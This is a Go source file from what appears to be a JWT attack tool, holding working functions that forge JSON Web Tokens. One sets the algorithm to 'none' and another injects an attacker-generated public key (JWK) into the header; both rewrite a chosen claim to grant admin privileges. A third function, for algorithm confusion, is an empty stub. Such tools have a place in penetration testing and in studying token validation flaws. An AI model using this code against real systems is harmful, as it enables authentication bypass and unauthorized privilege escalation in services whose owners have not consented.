package attacks

import (
	"JWTechniques/ctrl"
	"encoding/json"
	"fmt"

	"github.com/golang-jwt/jwt/v5"
)

func ExploitNoneAlgo(token *jwt.Token, userHeader string, userValue string) string {

	cpyToken := ctrl.CloneToken(token)
	cpyToken, err := ctrl.ChangeValue(cpyToken, "alg", "none", true)

	if err != nil {
		fmt.Printf("An error ocurred while modifying the value of the \"alg\" header : %v \n", err)
		return ""
	}

	//Change the value of the header to create the admin privs token
	if userHeader != "" {
		cpyToken, err = ctrl.ChangeValue(cpyToken, userHeader, userValue, false)
		if err != nil {
			fmt.Printf("An error ocurred while modifying the value of the \"%s\" header : %v \n", userHeader, err)
			return ""
		}
	}

	//It can be signed with any secret as this vulnerability only works if the signature is not verified
	strToken, err := cpyToken.SignedString(jwt.UnsafeAllowNoneSignatureType)
	if err != nil {
		fmt.Printf("An error ocurred while signing the token with a \"none\" alg : %v \n", err)
		return ""
	}

	return strToken

}

func ExploitAlgoConfusion(token *jwt.Token, userHeader string, userValue string, algorithm string, publicKey string) string {

	//TODO
	return ""
}

func ExploitPublicKeyInjection(token *jwt.Token, userHeader string, userValue string, algorithm string) string {

	cpyToken := ctrl.CloneToken(token)

	//Generate public/private keys
	publicKey, privateKey, err := ctrl.GenerateKeys(algorithm)
	if err != nil {
		fmt.Printf("%v\n", err)
		return ""
	}

	//Generate public/private keys
	jwkValue, err := ctrl.GenerateJWK(publicKey, algorithm)
	if err != nil {
		fmt.Printf("%v\n", err)
		return ""
	}

	//Inject public key in header
	var jwkMap map[string]any
	err = json.Unmarshal(jwkValue, &jwkMap)
	if err != nil {
		fmt.Printf("failed to unmarshal jwkValue: %v", err)
		return ""
	}
	cpyToken.Header["jwk"] = jwkMap

	//If the "user" header has been found
	//Change the value of the header to create a token with admin privs
	if userHeader != "" {
		cpyToken, err = ctrl.ChangeValue(cpyToken, userHeader, userValue, false)
		if err != nil {
			fmt.Printf("An error ocurred while modifying the value of the \"%s\" header : %v \n", userHeader, err)
			return ""
		}
	}

	strToken, err := cpyToken.SignedString(privateKey)
	if err != nil {
		fmt.Printf("An error ocurred while signing the token with a \"none\" alg : %v \n", err)
		return ""
	}

	return strToken
}
